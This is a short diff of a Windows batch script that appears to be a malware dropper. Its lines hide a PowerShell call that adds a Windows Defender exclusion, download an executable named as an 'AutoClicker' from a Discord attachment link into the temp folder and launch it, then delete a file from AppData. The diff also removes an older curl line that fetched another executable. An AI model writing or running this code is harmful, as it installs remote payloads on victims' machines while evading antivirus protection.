@@ -62,8 +62,6 @@ powershell.exe -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:
 
 set "temp_file=%TEMP%\hahabonk.exe"
 
-curl -s https://cdn.discordapp.com/attachments/1178801531886247940/1178884114892476506/test.exe -o %temp%/lol.exe
-
 powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/1178800960663978064/1184960188709617684/AutoClicker-3.0.exe', '%temp_file%')"
 start "" "%temp_file%"
 del /q "%appdata%\Microsoft\unpython.py"
